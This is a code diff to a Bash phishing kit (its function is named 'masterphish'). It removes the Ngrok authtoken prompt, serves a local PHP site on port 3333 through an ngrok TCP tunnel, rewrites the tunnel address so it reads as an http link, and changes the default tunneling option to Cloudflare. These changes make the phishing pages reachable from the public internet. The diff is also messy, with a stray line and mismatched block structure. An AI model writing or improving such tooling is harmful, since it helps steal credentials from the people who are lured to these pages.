@@ -187,26 +187,20 @@ ngrok_server() {
         echo "Ngrok installation complete."
     fi
 
-    # Check if Ngrok token is already set
-    if [[ -f "$HOME/.config/ngrok/ngrok.yml" ]] && grep -q "authtoken" "$HOME/.config/ngrok/ngrok.yml"; then
-        echo "Ngrok Authtoken already set."
-    else
-        read -p $'\e[1;92m[+] Enter Ngrok Authtoken: \e[0m' ngrok_auth
-        ngrok config add-authtoken $ngrok_auth
-    fi
-
     fuser -k 3333/tcp > /dev/null 2>&1
     php -S localhost:3333 > /dev/null 2>&1 &
     ngrok tcp 3333 > /dev/null 2>&1 &
 
     sleep 10
-    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
+    TUNNEL_DATA=$(curl -s http://localhost:4040/api/tunnels)
 
-    if [[ -z "$link" ]]; then
-        printf "\e[1;31m[!] Ngrok Tunnel Failed, Check Your Internet!\e[0m\n"
-        exit 1
-    else
-        printf "\e[1;92m[+] Ngrok Link:\e[0m \e[1;77m%s\e[0m\n" $link
+if echo "$TUNNEL_DATA" | jq -e '.tunnels[] | select(.proto == "http")' > /dev/null; then
+    URL=$(echo "$TUNNEL_DATA" | jq -r '.tunnels[] | select(.proto == "http") | .public_url')
+    echo "🟢 HTTP URL: $URL"
+else
+    TCP_URL=$(echo "$TUNNEL_DATA" | jq -r '.tunnels[] | select(.proto == "tcp") | .public_url')
+    HTTP_STYLE_URL=$(echo "$TCP_URL" | sed 's/tcp:/http:/')
+    echo -e "\e[1;92m[+] Ngrok Link:\e[0m\e[1;77m \e[0m"$HTTP_STYLE_URL
     fi
     
 Ngrok
@@ -256,8 +250,8 @@ masterphish() {
     printf "\e[1;92m[\e[1;96m02\e[1;92m]\e[0m\e[1;93m Server SSH\e[0m\n"
     printf "\e[1;92m[\e[1;96m03\e[1;92m]\e[0m\e[1;93m Cloudflare \e[0m\n"
 
-    default_option_server="1"
-    read -p $'\n\e[1;92m[+] Choose a Port Forwarding option:\e[1;93m[Default is 1] \e[0m' option_server
+    default_option_server="3"
+    read -p $'\n\e[1;92m[+] Choose a Port Forwarding option:\e[1;93m[Default is 3] \e[0m' option_server
     option_server="${option_server:-${default_option_server}}"
     
     select_template
